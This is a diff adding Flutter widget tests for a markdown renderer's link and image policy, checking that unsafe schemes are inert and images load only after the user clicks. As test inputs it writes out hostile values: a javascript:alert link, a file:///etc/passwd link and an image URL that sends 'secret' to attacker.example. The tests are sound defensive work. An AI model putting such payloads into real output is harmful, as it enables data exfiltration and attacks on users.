@@ -10,6 +10,7 @@
 // теста. Тесты идут без Material-предка: хостом служит `FluentApp`.
 
 import 'dart:async';
+import 'dart:convert';
 import 'dart:io';
 
 import 'package:codelab_ui/codelab_ui.dart';
@@ -1689,5 +1690,340 @@ final f = (int a) => a > 1 ? a >> 2 : a << 1;
           .first,
     );
     expect((block.decoration as BoxDecoration).color, dark.background);
+  });
+
+  // ---- Ссылки и изображения по политике app (итерация 4, задачи 4.1 и 4.3;
+  // design.md D2, D5, D6; DSK-7, VIEW-12) ----
+  //
+  // Политику (`canOpenLink`, `canLoadImage`) задаёт app и передаёт через
+  // `CodeLabMarkdownScope`; кит только рисует и сообщает о клике. В тестах
+  // кита политика — простые функции ниже, настоящая живёт в
+  // `link_policy.dart` приложения.
+
+  final pngBytes = base64Decode(
+    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA'
+    '60e6kgAAAABJRU5ErkJggg==',
+  );
+
+  bool canOpen(Uri uri) =>
+      ((uri.scheme == 'http' || uri.scheme == 'https') &&
+          uri.host.isNotEmpty) ||
+      (uri.scheme == 'mailto' && uri.path.isNotEmpty);
+  bool canLoad(Uri uri) => uri.scheme == 'https' && uri.host.isNotEmpty;
+
+  /// Состояние «приложения» в тесте: что открыто, что показано, сколько раз
+  /// запросили изображение.
+  final shown = ValueNotifier<Set<String>>({});
+  final opened = <Uri>[];
+  final imageRequests = <Uri>[];
+  late MemoryImage image;
+
+  Widget withPolicy(Widget child) => ValueListenableBuilder<Set<String>>(
+    valueListenable: shown,
+    builder: (context, shownImages, _) => CodeLabMarkdownScope(
+      canOpenLink: canOpen,
+      onOpenLink: opened.add,
+      canLoadImage: canLoad,
+      imageFor: (uri) {
+        imageRequests.add(uri);
+        return image;
+      },
+      shownImages: shownImages,
+      onShowImage: (key) => shown.value = {...shown.value, key},
+      child: child,
+    ),
+  );
+
+  setUp(() {
+    shown.value = {};
+    opened.clear();
+    imageRequests.clear();
+    image = MemoryImage(pngBytes);
+  });
+
+  testWidgets(
+    'link tap calls onOpenLink and non-http schemes are not tappable',
+    (tester) async {
+      await tester.pumpWidget(
+        _host(
+          withPolicy(
+            const CodeLabMarkdown(
+              id: 'agent-1',
+              text:
+                  '[docs](https://example.com/a?token=abc)\n\n'
+                  '[mail](mailto:dev@example.com)\n\n'
+                  '[js](javascript:alert(1))\n\n'
+                  '[file](file:///etc/passwd)\n\n'
+                  '[data](data:text/html,hi)\n\n'
+                  '[vsc](vscode://open)\n\n'
+                  '[rel](//evil.example/a)\n\n'
+                  '<xmpp:a@b>',
+            ),
+          ),
+        ),
+      );
+      await tester.pump();
+      expect(tester.takeException(), isNull);
+
+      // Клик отдаёт адрес из ссылки, а не её текст (`onLinkTap` пакета даёт
+      // только текст — прототип, факт 4).
+      await tester.tap(find.textContaining('docs', findRichText: true));
+      await tester.pump(const Duration(seconds: 1));
+      expect(opened, [Uri.parse('https://example.com/a?token=abc')]);
+
+      await tester.tap(find.textContaining('mail', findRichText: true));
+      await tester.pump(const Duration(seconds: 1));
+      expect(opened.last, Uri.parse('mailto:dev@example.com'));
+      expect(opened, hasLength(2));
+
+      // Остальные схемы — обычный текст: ни recognizer, ни вызова.
+      for (final label in ['js', 'file', 'data', 'vsc', 'rel', 'xmpp:a@b']) {
+        final finder = find.textContaining(label, findRichText: true);
+        expect(finder, findsAtLeastNWidgets(1), reason: label);
+        await tester.tap(finder.first);
+        await tester.pump(const Duration(seconds: 1));
+        final text = _richTextWith(tester, label);
+        text.text.visitChildren((span) {
+          if (span is TextSpan) {
+            expect(span.recognizer, isNull, reason: 'recognizer on $label');
+          }
+          return true;
+        });
+      }
+      expect(
+        opened,
+        hasLength(2),
+        reason: 'inactive links never call the port',
+      );
+    },
+  );
+
+  testWidgets('an active link is underlined in the accent color', (
+    tester,
+  ) async {
+    await tester.pumpWidget(
+      _host(
+        withPolicy(
+          const CodeLabMarkdown(
+            id: 'agent-1',
+            text: '[docs](https://example.com/a)\n\n[js](javascript:alert(1))',
+          ),
+        ),
+      ),
+    );
+    await tester.pump();
+
+    final theme = FluentTheme.of(tester.element(find.byType(CodeLabMarkdown)));
+    final accent = theme.accentColor.defaultBrushFor(theme.brightness);
+    final active = _richTextWith(tester, 'docs');
+    expect(_styleValue(active, (s) => s.decoration), TextDecoration.underline);
+    expect(_styleValue(active, (s) => s.color), accent);
+
+    final inactive = _richTextWith(tester, 'js');
+    expect(
+      _styleValue(inactive, (s) => s.decoration),
+      anyOf(isNull, TextDecoration.none),
+    );
+    expect(_styleValue(inactive, (s) => s.color), isNot(accent));
+  });
+
+  testWidgets('a link tooltip shows the full address with direction marks '
+      'escaped', (tester) async {
+    final rlo = String.fromCharCode(0x202E);
+    await tester.pumpWidget(
+      _host(
+        withPolicy(
+          CodeLabMarkdown(
+            id: 'agent-1',
+            text:
+                '[docs](https://example.com/a?token=abc)\n\n'
+                '[bidi](https://example.com/${rlo}gpj)',
+          ),
+        ),
+      ),
+    );
+    await tester.pump();
+
+    bool tooltip(String message) => find
+        .byWidgetPredicate((w) => w is Tooltip && w.message == message)
+        .evaluate()
+        .isNotEmpty;
+    expect(tooltip('https://example.com/a?token=abc'), isTrue);
+    expect(tooltip('https://example.com/\\u202egpj'), isTrue);
+    expect(tooltip('https://example.com/${rlo}gpj'), isFalse);
+  });
+
+  testWidgets('markdown image is not fetched before user action', (
+    tester,
+  ) async {
+    debugNetworkImageHttpClientProvider = _ForbiddenHttpClient.new;
+    try {
+      await tester.pumpWidget(
+        _host(
+          withPolicy(
+            const CodeLabMarkdown(
+              id: 'agent-1',
+              text:
+                  '![](https://attacker.example/?d=secret)\n\n'
+                  '![p](https://x.example/p.svg)',
+            ),
+          ),
+        ),
+      );
+      await tester.pump();
+      await tester.pump(const Duration(milliseconds: 100));
+
+      // Сеть и `imageFor` не тронуты (tearDown проверяет запросы): только
+      // заглушки с хостом и кнопкой «Show image».
+      expect(imageRequests, isEmpty);
+      expect(find.byType(Image), findsNothing);
+      expect(find.byType(CodeLabImagePlaceholder), findsNWidgets(2));
+      expect(find.text('Show image'), findsNWidgets(2));
+      expect(
+        find.textContaining('attacker.example', findRichText: true),
+        findsOneWidget,
+      );
+      expect(
+        find.textContaining('x.example', findRichText: true),
+        findsOneWidget,
+      );
+    } finally {
+      debugNetworkImageHttpClientProvider = null;
+    }
+  });
+
+  testWidgets('show image loads the picture once and shows it', (tester) async {
+    await tester.pumpWidget(
+      _host(
+        withPolicy(
+          const CodeLabMarkdown(
+            id: 'agent-1',
+            text: '![](https://x.example/y.png)',
+          ),
+        ),
+      ),
+    );
+    await tester.pump();
+    expect(find.byType(Image), findsNothing);
+
+    await tester.tap(find.text('Show image'));
+    await tester.pump();
+    await tester.pump();
+
+    // Ключ выбора — строка и адрес (D6); картинка запрошена у app один раз и
+    // показана вместо заглушки.
+    expect(shown.value, {'agent-1#image:https://x.example/y.png'});
+    expect(imageRequests, [Uri.parse('https://x.example/y.png')]);
+    expect(find.byType(Image), findsOneWidget);
+    expect(tester.widget<Image>(find.byType(Image)).image, same(image));
+    expect(find.text('Show image'), findsNothing);
+  });
+
+  testWidgets('a shown image survives the row leaving the screen', (
+    tester,
+  ) async {
+    tester.view.physicalSize = const Size(700, 500);
+    tester.view.devicePixelRatio = 1;
+    addTearDown(tester.view.resetPhysicalSize);
+    addTearDown(tester.view.resetDevicePixelRatio);
+    final rows = [
+      const CodeLabAgentTextRow(
+        id: 'agent-1',
+        text: '![](https://x.example/y.png)',
+      ),
+      for (var i = 0; i < 60; i++)
+        CodeLabUserRow(id: 'prompt-${i + 2}', text: 'filler line number $i'),
+    ];
+    await tester.pumpWidget(
+      FluentApp(home: withPolicy(CodeLabTranscriptPanel(rows: rows))),
+    );
+    await tester.pump();
+
+    await tester.tap(find.text('Show image'));
+    await tester.pump();
+    await tester.pump();
+    expect(find.byType(Image), findsOneWidget);
+
+    // Строка уходит с экрана и уничтожается лентой.
+    await tester.drag(find.byType(Scrollable).first, const Offset(0, -6000));
+    await tester.pump();
+    expect(find.byType(Image), findsNothing);
+    expect(find.text('filler line number 59'), findsOneWidget);
+
+    // И возвращается: выбор пользователя жив, повторного клика не нужно.
+    await tester.drag(find.byType(Scrollable).first, const Offset(0, 6000));
+    await tester.pump();
+    await tester.pump();
+    expect(find.byType(Image), findsOneWidget);
+    expect(find.text('Show image'), findsNothing);
+    expect(shown.value, {'agent-1#image:https://x.example/y.png'});
+  });
+
+  testWidgets('a shown image does not open the same url in another answer', (
+    tester,
+  ) async {
+    shown.value = {'agent-1#image:https://x.example/y.png'};
+    await tester.pumpWidget(
+      _host(
+        withPolicy(
+          Column(
+            children: const [
+              CodeLabMarkdown(
+                id: 'agent-1',
+                text: '![](https://x.example/y.png)',
+              ),
+              CodeLabMarkdown(
+                id: 'agent-3',
+                text: '![](https://x.example/y.png)',
+              ),
+            ],
+          ),
+        ),
+      ),
+    );
+    await tester.pump();
+
+    expect(find.byType(Image), findsOneWidget);
+    expect(find.text('Show image'), findsOneWidget);
+  });
+
+  testWidgets('http and data images are placeholders without Show image', (
+    tester,
+  ) async {
+    await tester.pumpWidget(
+      _host(
+        withPolicy(
+          const CodeLabMarkdown(
+            id: 'agent-1',
+            text:
+                '![a](http://x.example/y.png)\n\n'
+                '![b](data:image/png;base64,AAAA)',
+          ),
+        ),
+      ),
+    );
+    await tester.pump();
+
+    expect(find.byType(CodeLabImagePlaceholder), findsNWidgets(2));
+    expect(find.text('Show image'), findsNothing);
+    expect(find.byType(Image), findsNothing);
+    expect(imageRequests, isEmpty);
+  });
+
+  testWidgets('without a scope images have no Show image button', (
+    tester,
+  ) async {
+    await tester.pumpWidget(
+      _host(
+        const CodeLabMarkdown(
+          id: 'agent-1',
+          text: '![](https://x.example/y.png)',
+        ),
+      ),
+    );
+    await tester.pump();
+
+    expect(find.byType(CodeLabImagePlaceholder), findsOneWidget);
+    expect(find.text('Show image'), findsNothing);
   });
 }
